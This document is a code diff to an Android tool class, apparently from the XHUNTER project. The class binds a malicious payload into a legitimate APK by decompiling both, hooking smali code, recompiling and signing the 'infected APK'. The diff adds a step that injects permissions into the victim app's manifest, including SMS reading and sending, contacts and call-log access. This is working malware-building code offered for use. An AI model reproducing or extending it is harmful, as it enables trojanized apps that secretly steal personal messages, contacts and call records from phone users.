@@ -4,7 +4,6 @@ import android.content.res.AssetManager;
 import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Environment;
-import android.util.Log;
 
 import com.android.apksigner.ApkSignerTool;
 import com.facebook.react.bridge.ReactApplicationContext;
@@ -19,6 +18,7 @@ import org.xmlpull.v1.XmlPullParserFactory;
 
 import java.io.BufferedReader;
 import java.io.File;
+import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.FileReader;
 import java.io.FileWriter;
@@ -38,11 +38,13 @@ public class AppBinder extends AsyncTask<String, String, Boolean> {
     private final String working_dir;
     private final String res_dir;
     private final Logger log;
+    private final Boolean injectPermission;
 
 
-    public AppBinder(ReactApplicationContext context){
+    public AppBinder(ReactApplicationContext context, Boolean injectPermission){
         this.working_dir= Environment.getExternalStorageDirectory().getPath()+"/XHUNTER/payload/";
         this.reactContext=context;
+        this.injectPermission=injectPermission;
         this.log =new Logger(reactContext);
         this.res_dir =reactContext.getFilesDir().getAbsolutePath()+"/res/";
     }
@@ -50,29 +52,22 @@ public class AppBinder extends AsyncTask<String, String, Boolean> {
     @Override
     protected Boolean doInBackground(String... strings) {
         init();
-        if (loadResources()) {
-            if (decompile_normal_apk(strings[0])) {
-                if (decompile_payload()) {
-                    if (move_payload_files_to_normal_apk()) {
-                        if (edit_app(strings[1])) {
-                            if (hook_smali_file(strings[0])) {
-                                if (compile_build()) {
-                                    if (sign()) {
-                                        deleteFolder(working_dir + "normal_apk");
-                                        deleteFolder(working_dir + "payload");
-                                        deleteFile(working_dir+"unsigned.apk");
-                                        log.s("[+] Output : /XHUNTER/payload/xhunter_payload.apk");
-                                        log.done("!!!! HAPPY HUNTING !!!!");
-                                        return true;
-                                    }
-                                }
-                            }
-
-                        }
-                    }
-                }
-            }
-        }
+        if (loadResources())
+            if (decompile_normal_apk(strings[0]))
+                if (decompile_payload())
+                    if (move_payload_files_to_normal_apk())
+                        if (edit_app(strings[1]))
+                            if (hook_smali_file(strings[0]))
+                                if(injectPermission&&inject_permissions())
+                                    if (compile_build())
+                                        if (sign()) {
+                                            deleteFolder(working_dir + "normal_apk");
+                                            deleteFolder(working_dir + "payload");
+                                            deleteFile(working_dir+"unsigned.apk");
+                                            log.s("[+] Output : /XHUNTER/payload/xhunter_payload.apk");
+                                            log.done("!!!! HAPPY HUNTING !!!!");
+                                            return true;
+                                        }
         return true;
     }
 
@@ -87,6 +82,9 @@ public class AppBinder extends AsyncTask<String, String, Boolean> {
     private boolean loadResources(){
         log.i("Loading Required Resources..");
         try{
+            if(injectPermission){
+                copyAssets(reactContext.getAssets(), "bin", reactContext.getFilesDir());
+            }
             copyAssets(reactContext.getAssets(), "res", reactContext.getFilesDir());
             log.s("[+] Loaded Required Resources Successfully!");
             return true;
@@ -108,10 +106,15 @@ public class AppBinder extends AsyncTask<String, String, Boolean> {
         }
     }
     private boolean decompile_normal_apk(String targetApkPath) {
-        log.i( "[*] Decompiling Normal/Legitimate APK");
+        log.i( "[*] Decompiling Normal/Legitimate APK ");
         log.w("[?] It usually takes few minutes, Do not close app or lock screen!");
         try {
-            Main.main(new String[]{"d", "-r", "-f", targetApkPath , "-o", working_dir+"normal_apk", });
+            if(injectPermission){
+                String framework =reactContext.getFilesDir().getAbsolutePath()+"/framework";
+                Main.main(new String[]{"d", "-p", framework, "-f", targetApkPath , "-o", working_dir+"normal_apk"});
+            }else {
+                Main.main(new String[]{"d", "-r", "-f", targetApkPath , "-o", working_dir+"normal_apk"});
+            }
             log.s( "[+] Decompiled Successfully !");
             return true;
         } catch (Exception e) {
@@ -203,11 +206,33 @@ public class AppBinder extends AsyncTask<String, String, Boolean> {
             return false;
         }
     }
+    private boolean inject_permissions(){
+        log.i("[*] Injectng permissions...");
+        String manifest = readManifest();
+        int index=manifest.indexOf("<uses-permission");
+        String newManifest = manifest.substring(0, index) + PERMISSIONS + manifest.substring(index);
+        try {
+            FileOutputStream fileOut = new FileOutputStream(working_dir + "normal_apk/AndroidManifest.xml"); //writes file
+            fileOut.write(newManifest.getBytes());
+            fileOut.close();
+            log.s("[*] Permissions inject success!");
+            return true;
+        }catch (IOException e) {
+            log.e("[!] Failed to inject permissions");
+            log.ex("Error: "+ e.toString());
+            return false;
+        }
+    }
     private boolean compile_build() {
         log.i("[*] Compiling Infected APK, Please wait.");
         log.w("[?] It usually takes few minutes, Do not close app or lock screen!");
         try {
-            Main.main(new String[]{"b", working_dir+"normal_apk", "-o", working_dir+"unsigned.apk"});
+            if(injectPermission){
+                String framework =reactContext.getFilesDir().getAbsolutePath()+"/framework";
+                Main.main(new String[]{"b","-a", getAapt(),"-p", framework, working_dir+"normal_apk", "-o", working_dir+"unsigned.apk"});
+            }else{
+                Main.main(new String[]{"b", working_dir+"normal_apk", "-o", working_dir+"unsigned.apk"});
+            }
             log.s("[+] Compiled Infected APK Successfully !");
             return true;
         } catch (Exception e) {
@@ -219,14 +244,9 @@ public class AppBinder extends AsyncTask<String, String, Boolean> {
     private boolean sign() {
        log.i("[*] Trying to Sign APK Using APKsigner");
         try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                ApkSignerTool.main(new String[]{"sign", "--key", res_dir+"test.pk8", "--cert", res_dir+"test.pem", "--out", working_dir+"xhunter_payload.apk", working_dir+"unsigned.apk"});
-                log.s("[+] Signed Infected APK !");
-                return true;
-            }else {
-                log.e("[!] Failed to Sign, Device not compatible try on other device.");
-                return false;
-            }
+            ApkSignerTool.main(new String[]{"sign", "--key", res_dir+"test.pk8", "--cert", res_dir+"test.pem", "--out", working_dir+"xhunter_payload.apk", working_dir+"unsigned.apk"});
+            log.s("[+] Signed Infected APK !");
+            return true;
         } catch (Exception e) {
             log.e("[!] Failed to Sign Infected APK");
             log.ex("Error: "+e.toString());
@@ -396,7 +416,6 @@ public class AppBinder extends AsyncTask<String, String, Boolean> {
         inputStream.close();
         outputStream.close();
         aaptBin.setExecutable(true);
-        Log.w("xhunter","AAPT : "+aaptBin.getAbsolutePath());
         return aaptBin.getAbsolutePath();
     }
     private String getAapt2() throws IOException {
@@ -428,5 +447,25 @@ public class AppBinder extends AsyncTask<String, String, Boolean> {
         }
         return "armeabi-v7a";
     }
+    private String readManifest(){
+        StringBuilder builder = new StringBuilder();
+        try (BufferedReader buffer = new BufferedReader(new FileReader(working_dir+"normal_apk/AndroidManifest.xml"))) {
+            String str;
+            while ((str = buffer.readLine()) != null) {
+                builder.append(str).append("\n");
+            }
+        }
+        catch (IOException e) {
+            e.printStackTrace();
+        }
+        return builder.toString();
+    }
+
+    private static String PERMISSIONS="   <uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\" />\n" +
+            "    <uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/>\n" +
+            "    <uses-permission android:name=\"android.permission.READ_SMS\" />\n" +
+            "    <uses-permission android:name=\"android.permission.READ_CONTACTS\" />\n" +
+            "    <uses-permission android:name=\"android.permission.READ_CALL_LOG\" />\n" +
+            "    <uses-permission android:name=\"android.permission.SEND_SMS\" />\n";
 
 }
